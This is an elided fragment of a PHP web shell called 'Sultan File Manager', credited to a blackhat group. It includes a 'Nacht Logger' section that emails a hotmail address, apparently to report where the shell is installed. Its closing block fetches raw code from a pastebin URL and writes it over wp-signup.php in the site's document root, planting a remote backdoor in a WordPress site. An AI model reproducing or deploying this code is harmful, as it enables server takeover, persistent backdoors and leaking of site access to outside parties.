...
<BODY>
<H1><center>Sultan File Manager</center></H1>
...
echo '<br />Sultan File Manager Version <font color="red">1.1</font>, Coded By <font color="red">Raymond7</font><br />Home: <font color="red">www.jakartablackhat.org</font>
</BODY>
</HTML>';
function perms($file){
...
$ra44 = rand(1, 99999);
$subj98 = " Nacht Logger The Revolution |$ra44";
$email = "seringdipanggilganteng@hotmail.com";
$from = "From: Manusia Lalai <3 Shell<botv5@misterspybot.com";
...
?>
<?php
$check3=$_SERVER['DOCUMENT_ROOT'] . "/wp-signup.php" ;
$text3 = http_get('https://pastebin.com/raw/wzWiJajE');
$op3=fopen($check3, 'w');
fwrite($op3,$text3);
fclose($op3);
?>
